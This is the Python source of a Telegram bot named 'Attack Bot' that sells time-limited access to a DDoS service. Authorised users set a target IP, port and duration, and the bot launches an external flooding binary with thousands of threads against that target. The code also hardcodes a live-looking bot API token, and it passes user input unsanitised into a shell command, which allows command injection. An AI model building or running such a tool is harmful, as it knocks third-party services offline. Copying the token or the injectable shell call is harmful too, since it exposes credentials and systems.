import telebot
import asyncio
import json
import random
from datetime import datetime, timedelta

API_TOKEN = '7343295464:AAEM7vk5K3cNXAywZC_Q11wmMzMu4gk09PU'
bot = telebot.TeleBot(API_TOKEN)
users_file = 'users.json'
attack_data = {}
VPS_IPS = ["45.13.57.2", "188.114.96.1", "104.21.23.2", "172.67.219.1", "20.52.45.7"]

# User DB
def load_users():
    try:
        with open(users_file, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(data):
    with open(users_file, 'w') as f:
        json.dump(data, f, indent=2)

def is_user_active(user_id):
    users = load_users()
    data = users.get(str(user_id))
    if not data:
        return False
    return datetime.strptime(data['expires'], "%Y-%m-%d") > datetime.now()

# /start command
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message,
        "Welcome to Attack Bot!\nUse /panel to see all commands.")

# /user <id> <days>
@bot.message_handler(commands=['user'])
def activate_user(message):
    try:
        _, user_id, days = message.text.split()
        users = load_users()
        users[user_id] = {
            "expires": (datetime.now() + timedelta(days=int(days))).strftime("%Y-%m-%d")
        }
        save_users(users)
        bot.reply_to(message, f"✅ User {user_id} activated for {days} days.")
    except:
        bot.reply_to(message, "❌ Usage: /user <id> <days>")

# /remove <id>
@bot.message_handler(commands=['remove'])
def remove_user(message):
    try:
        _, user_id = message.text.split()
        users = load_users()
        if user_id in users:
            del users[user_id]
            save_users(users)
            bot.reply_to(message, f"❌ User {user_id} removed.")
        else:
            bot.reply_to(message, "User not found.")
    except:
        bot.reply_to(message, "❌ Usage: /remove <id>")

# /attack <ip> <port> <time>
@bot.message_handler(commands=['attack'])
def set_attack(message):
    user_id = message.from_user.id
    if not is_user_active(user_id):
        return bot.reply_to(message, "❌ You are not authorized. Contact admin.")

    try:
        _, ip, port, duration = message.text.split()
        threads = random.randint(700, 12000)
        vps_ip = random.choice(VPS_IPS)

        attack_data[user_id] = {
            "ip": ip,
            "port": port,
            "time": duration,
            "threads": threads,
            "vps": vps_ip,
            "process": None
        }

        bot.reply_to(message,
            f"✅ Attack Target Set:\n"
            f"IP: {ip}\nPORT: {port}\nTIME: {duration}s\nTHREADS: {threads}\nVPS: {vps_ip}")
    except:
        bot.reply_to(message, "❌ Usage: /attack <ip> <port> <time>")

# /startattack
@bot.message_handler(commands=['startattack'])
def start_attack(message):
    user_id = message.from_user.id
    if user_id not in attack_data:
        return bot.reply_to(message, "❌ Set target first using /attack.")

    if not is_user_active(user_id):
        return bot.reply_to(message, "❌ You are not authorized.")

    data = attack_data[user_id]

    async def run_attack():
        try:
            cmd = f"./Moin {data['ip']} {data['port']} {data['time']} {data['threads']}"
            proc = await asyncio.create_subprocess_shell(cmd)
            data["process"] = proc
            await proc.wait()
        except Exception as e:
            bot.send_message(user_id, f"⚠️ Error launching attack: {e}")

    asyncio.create_task(run_attack())
    bot.reply_to(message,
        f"🚀 Attack started!\n\n"
        f"Target: {data['ip']}:{data['port']}\n"
        f"Duration: {data['time']}s\n"
        f"Threads: {data['threads']}\n"
        f"VPS: {data['vps']}")

# /stopattack
@bot.message_handler(commands=['stopattack'])
def stop_attack(message):
    user_id = message.from_user.id
    data = attack_data.get(user_id)
    if data and data.get("process"):
        try:
            data["process"].kill()
            bot.reply_to(message, "🛑 Attack stopped.")
        except:
            bot.reply_to(message, "⚠️ Could not stop the attack.")
    else:
        bot.reply_to(message, "⚠️ No active attack.")

# /panel
@bot.message_handler(commands=['panel'])
def show_panel(message):
    panel = (
        "**⚙️ Command Panel**\n\n"
        "/start - Start Bot\n"
        "/user <id> <days> - Activate user\n"
        "/remove <id> - Remove user\n"
        "/attack <ip> <port> <time> - Set attack target\n"
        "/startattack - Start attack\n"
        "/stopattack - Stop attack\n"
        "/panel - Show this panel"
    )
    bot.reply_to(message, panel, parse_mode="Markdown")

# Run the bot
print("✅ Bot running...")
bot.infinity_polling()